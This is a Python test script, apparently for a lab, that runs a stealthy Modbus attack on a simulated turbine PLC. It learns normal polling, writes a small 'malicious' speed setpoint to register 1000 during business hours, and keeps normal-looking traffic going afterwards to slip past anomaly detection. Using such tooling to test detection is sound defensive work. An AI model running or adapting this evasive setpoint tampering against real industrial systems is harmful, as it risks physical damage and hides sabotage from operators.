#!/usr/bin/env python3
"""
Anomaly Detection Bypass Test
Tests whether attacks can blend with normal traffic patterns
"""

import time
from datetime import datetime
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException
import json
from typing import Optional, Dict, Any, List

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'plc': {
        'ip': '127.0.0.1',
        'port': 502
    },
    'normal_patterns': {
        'hmi_poll_interval': 1.0,  # HMI polls every 1 second
        'typical_read_size': 15,  # Read 10-20 registers typically
        'typical_write_size': 3,  # Write 1-5 registers typically
        'business_hours': (9, 17),  # 9 AM - 5 PM
        'operational_variance': 50  # Normal setpoint variance +/- 50 RPM
    },
    'attack': {
        'target_register': 1000,  # Speed setpoint register
        'normal_value': 1500,  # Expected normal value
        'malicious_value': 1490,  # Attack value (small change)
        'learning_cycles': 5,  # Cycles to observe before attack
        'post_attack_monitoring': 10  # Cycles to monitor after attack
    }
}


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def is_business_hours() -> bool:
    """Check if current time is within business hours"""
    current_hour = datetime.now().hour
    start_hour, end_hour = CONFIG['normal_patterns']['business_hours']
    return start_hour <= current_hour < end_hour


def log_traffic_pattern(operation: str, details: Dict[str, Any]) -> None:
    """Log traffic pattern for analysis"""
    timestamp = datetime.now().isoformat()
    log_entry = {
        'timestamp': timestamp,
        'operation': operation,
        'details': details
    }
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {operation}: {details}")


# ============================================================================
# ATTACK FUNCTIONS
# ============================================================================

def connect_to_plc(ip: str, port: int) -> Optional[ModbusTcpClient]:
    """
    Establish connection to PLC with proper error handling

    Args:
        ip: PLC IP address
        port: Modbus TCP port

    Returns:
        ModbusTcpClient instance if successful, None otherwise
    """
    try:
        client = ModbusTcpClient(ip, port=port)
        if client.connect():
            print(f"[*] Connected to PLC at {ip}:{port}")
            return client
        else:
            print(f"[!] Failed to connect to {ip}:{port}")
            return None
    except ConnectionRefusedError:
        print(f"[!] Connection refused by {ip}:{port}")
        return None
    except OSError as e:
        print(f"[!] Network error connecting to {ip}:{port}: {e}")
        return None
    except Exception as e:
        print(f"[!] Unexpected error connecting to {ip}:{port}: {e}")
        return None


def read_registers_safely(
        client: ModbusTcpClient,
        address: int,
        count: int
) -> Optional[List[int]]:
    """
    Safely read Modbus registers with error handling

    Args:
        client: Connected Modbus client
        address: Starting register address
        count: Number of registers to read

    Returns:
        List of register values if successful, None otherwise
    """
    try:
        result = client.read_holding_registers(address, count)

        if result.isError():
            print(f"[!] Modbus error reading registers at {address}")
            return None

        return result.registers

    except ModbusException as e:
        print(f"[!] Modbus exception during read: {e}")
        return None
    except AttributeError as e:
        print(f"[!] Invalid client or result object: {e}")
        return None
    except Exception as e:
        print(f"[!] Unexpected error reading registers: {e}")
        return None


def write_register_safely(
        client: ModbusTcpClient,
        address: int,
        value: int
) -> bool:
    """
    Safely write to Modbus register with error handling

    Args:
        client: Connected Modbus client
        address: Register address
        value: Value to write

    Returns:
        True if successful, False otherwise
    """
    try:
        result = client.write_register(address, value)

        if result.isError():
            print(f"[!] Modbus error writing to register {address}")
            return False

        return True

    except ModbusException as e:
        print(f"[!] Modbus exception during write: {e}")
        return False
    except AttributeError as e:
        print(f"[!] Invalid client or result object: {e}")
        return False
    except Exception as e:
        print(f"[!] Unexpected error writing register: {e}")
        return False


def phase1_learn_patterns(client: ModbusTcpClient) -> Dict[str, Any]:
    """
    Phase 1: Observe and learn normal operational patterns

    Args:
        client: Connected Modbus client

    Returns:
        Dictionary containing observed patterns
    """
    print("\n" + "=" * 70)
    print("[*] PHASE 1: Learning Normal Operations")
    print("=" * 70)

    patterns = {
        'hmi_poll_interval': CONFIG['normal_patterns']['hmi_poll_interval'],
        'typical_read_size': CONFIG['normal_patterns']['typical_read_size'],
        'observed_values': [],
        'success': False
    }

    print(f"[*] Simulating normal HMI polling behavior")
    print(f"    • Poll interval: {patterns['hmi_poll_interval']}s")
    print(f"    • Read size: {patterns['typical_read_size']} registers")
    print(f"    • Cycles: {CONFIG['attack']['learning_cycles']}")

    success_count = 0

    for cycle in range(CONFIG['attack']['learning_cycles']):
        print(f"\n[*] Learning cycle {cycle + 1}/{CONFIG['attack']['learning_cycles']}")

        # Perform normal-looking read operation
        registers = read_registers_safely(
            client,
            CONFIG['attack']['target_register'],
            patterns['typical_read_size']
        )

        if registers:
            patterns['observed_values'].append(registers[0])
            success_count += 1

            log_traffic_pattern(
                "Normal Read",
                {
                    'address': CONFIG['attack']['target_register'],
                    'count': patterns['typical_read_size'],
                    'value': registers[0]
                }
            )
        else:
            print(f"    [!] Read failed on cycle {cycle + 1}")

        # Wait to match normal polling interval
        time.sleep(patterns['hmi_poll_interval'])

    if success_count > 0:
        avg_value = sum(patterns['observed_values']) / len(patterns['observed_values'])
        patterns['average_value'] = avg_value
        patterns['success'] = True

        print(f"\n[*] Learning complete:")
        print(f"    • Successful reads: {success_count}/{CONFIG['attack']['learning_cycles']}")
        print(f"    • Average setpoint: {avg_value:.1f} RPM")
        print(f"    • Observed range: {min(patterns['observed_values'])} - {max(patterns['observed_values'])} RPM")
    else:
        print(f"\n[!] Learning phase failed - no successful reads")

    return patterns


def phase2_stealthy_attack(
        client: ModbusTcpClient,
        learned_patterns: Dict[str, Any]
) -> bool:
    """
    Phase 2: Perform attack that blends with normal operations

    Args:
        client: Connected Modbus client
        learned_patterns: Patterns observed in Phase 1

    Returns:
        True if attack succeeded, False otherwise
    """
    print("\n" + "=" * 70)
    print("[*] PHASE 2: Performing Stealthy Attack")
    print("=" * 70)

    # Check if we're in business hours (more believable time for changes)
    in_business_hours = is_business_hours()
    current_time = datetime.now().strftime('%H:%M:%S')

    print(f"[*] Current time: {current_time}")
    print(f"[*] Business hours (9 AM - 5 PM): {'YES' if in_business_hours else 'NO'}")

    if not in_business_hours:
        print("[!] WARNING: Outside business hours - attack more suspicious")

    # Read current value
    print(f"\n[*] Reading current setpoint (appears as engineering check)...")
    registers = read_registers_safely(
        client,
        CONFIG['attack']['target_register'],
        CONFIG['normal_patterns']['typical_read_size']
    )

    if not registers:
        print("[!] Failed to read current value")
        return False

    current_value = registers[0]
    target_value = CONFIG['attack']['malicious_value']
    variance = abs(current_value - target_value)
    max_variance = CONFIG['normal_patterns']['operational_variance']

    print(f"    Current value: {current_value} RPM")
    print(f"    Target value: {target_value} RPM")
    print(f"    Variance: {variance} RPM (max normal: {max_variance} RPM)")

    if variance > max_variance:
        print(f"[!] WARNING: Change of {variance} RPM exceeds normal variance!")
        print(f"[!] This may trigger anomaly detection")
    else:
        print(f"[✓] Change is within normal operational variance")

    # Perform the write (appears as normal engineering adjustment)
    print(f"\n[*] Writing new setpoint (appears as normal adjustment)...")

    if write_register_safely(client, CONFIG['attack']['target_register'], target_value):
        print(f"[✓] Setpoint modified: {current_value} → {target_value} RPM")

        log_traffic_pattern(
            "Engineering Write",
            {
                'address': CONFIG['attack']['target_register'],
                'old_value': current_value,
                'new_value': target_value,
                'variance': variance,
                'business_hours': in_business_hours
            }
        )

        # Verify the write
        time.sleep(0.5)
        verify = read_registers_safely(
            client,
            CONFIG['attack']['target_register'],
            1
        )

        if verify and verify[0] == target_value:
            print(f"[✓] Write verified: {verify[0]} RPM")
            return True
        else:
            print(f"[!] Write verification failed")
            return False
    else:
        print(f"[!] Write operation failed")
        return False


def phase3_maintain_cover(client: ModbusTcpClient) -> None:
    """
    Phase 3: Continue normal-looking operations to maintain cover

    Args:
        client: Connected Modbus client
    """
    print("\n" + "=" * 70)
    print("[*] PHASE 3: Maintaining Cover")
    print("=" * 70)

    print(f"[*] Continuing normal polling behavior")
    print(f"[*] Monitoring for {CONFIG['attack']['post_attack_monitoring']} cycles")

    for cycle in range(CONFIG['attack']['post_attack_monitoring']):
        print(f"\n[*] Monitoring cycle {cycle + 1}/{CONFIG['attack']['post_attack_monitoring']}")

        registers = read_registers_safely(
            client,
            CONFIG['attack']['target_register'],
            CONFIG['normal_patterns']['typical_read_size']
        )

        if registers:
            log_traffic_pattern(
                "Normal Monitoring",
                {
                    'address': CONFIG['attack']['target_register'],
                    'value': registers[0],
                    'post_attack': True
                }
            )

        time.sleep(CONFIG['normal_patterns']['hmi_poll_interval'])

    print(f"\n[*] Cover maintained - traffic appears normal")


def test_anomaly_bypass(plc_ip: str, plc_port: int) -> Dict[str, Any]:
    """
    Main test function for anomaly detection bypass

    Args:
        plc_ip: PLC IP address
        plc_port: Modbus TCP port

    Returns:
        Dictionary containing test results
    """
    test_start = datetime.now()

    print("=" * 70)
    print("[*] Anomaly Detection Bypass Test")
    print("=" * 70)
    print(f"[*] Test Start: {test_start.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {plc_ip}:{plc_port}")
    print(f"\n[*] Strategy: Slow, deliberate actions matching normal patterns")

    results = {
        'test_start': test_start.isoformat(),
        'target': f"{plc_ip}:{plc_port}",
        'phases': {},
        'success': False
    }

    # Connect to PLC
    client = connect_to_plc(plc_ip, plc_port)
    if not client:
        print("\n[!] Test aborted - could not connect to PLC")
        results['error'] = 'Connection failed'
        return results

    try:
        # Phase 1: Learn patterns
        learned_patterns = phase1_learn_patterns(client)
        results['phases']['learning'] = learned_patterns

        if not learned_patterns['success']:
            print("\n[!] Cannot proceed - learning phase failed")
            return results

        # Wait between phases (appears as normal delay)
        time.sleep(2)

        # Phase 2: Execute attack
        attack_success = phase2_stealthy_attack(client, learned_patterns)
        results['phases']['attack'] = {
            'success': attack_success,
            'timestamp': datetime.now().isoformat()
        }

        if not attack_success:
            print("\n[!] Attack phase failed")
            return results

        # Wait between phases
        time.sleep(2)

        # Phase 3: Maintain cover
        phase3_maintain_cover(client)
        results['phases']['cover'] = {
            'success': True,
            'timestamp': datetime.now().isoformat()
        }

        results['success'] = True

    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        results['error'] = 'User interrupted'
    except Exception as e:
        print(f"\n[!] Unexpected error during test: {e}")
        results['error'] = str(e)
    finally:
        # Always close connection
        try:
            client.close()
            print("\n[*] Connection closed")
        except Exception:
            pass

    test_end = datetime.now()
    duration = test_end - test_start
    results['test_end'] = test_end.isoformat()
    results['duration_seconds'] = duration.total_seconds()

    # Print summary
    print("\n" + "=" * 70)
    print("[*] TEST SUMMARY")
    print("=" * 70)
    print(f"[*] Duration: {duration}")
    print(f"[*] Success: {results['success']}")

    print("\n[*] TRAFFIC CHARACTERISTICS:")
    print("    ✓ Timing: Matches normal HMI polling (1s intervals)")
    print("    ✓ Frequency: Matches typical operations")
    print("    ✓ Packet size: Standard Modbus read/write")
    print(
        f"    {'✓' if is_business_hours() else '✗'} Time of day: {'During' if is_business_hours() else 'Outside'} business hours")
    print("    ✓ Change size: Within normal operational variance")

    print("\n[*] EXPECTED ANOMALY DETECTION RESULT:")
    if results['success']:
        print("    ✓ NO ALERTS - Traffic appears completely normal")
        print("    ✓ Attack blended successfully with legitimate operations")
    else:
        print("    ✗ Attack may have triggered alerts due to failures")

    print("\n[*] EVASION TECHNIQUES USED:")
    print("    • Matched normal polling intervals")
    print("    • Used typical Modbus register counts")
    print("    • Performed during business hours (if possible)")
    print("    • Small setpoint changes within normal variance")
    print("    • Maintained normal traffic after attack")

    # Save detailed report
    filename = f'anomaly_bypass_test_{test_start.strftime("%Y%m%d_%H%M%S")}.json'
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n[*] Detailed report saved to: {filename}")
    except IOError as e:
        print(f"\n[!] Failed to save report: {e}")

    return results


# ============================================================================
# MAIN EXECUTION
# ============================================================================

if __name__ == '__main__':
    print("\n[*] This test demonstrates how attacks can evade anomaly detection")
    print("[*] by blending with normal traffic patterns\n")

    # Use configuration
    plc_ip = CONFIG['plc']['ip']
    plc_port = CONFIG['plc']['port']

    print(f"[*] Target PLC: {plc_ip}:{plc_port}")
    print("[*] Ensure turbine_simulator.py is running\n")

    response = input("Proceed with anomaly bypass test? (yes/no): ")
    if response.lower() in ['yes', 'y']:
        test_anomaly_bypass(plc_ip, plc_port)
    else:
        print("[*] Test cancelled")
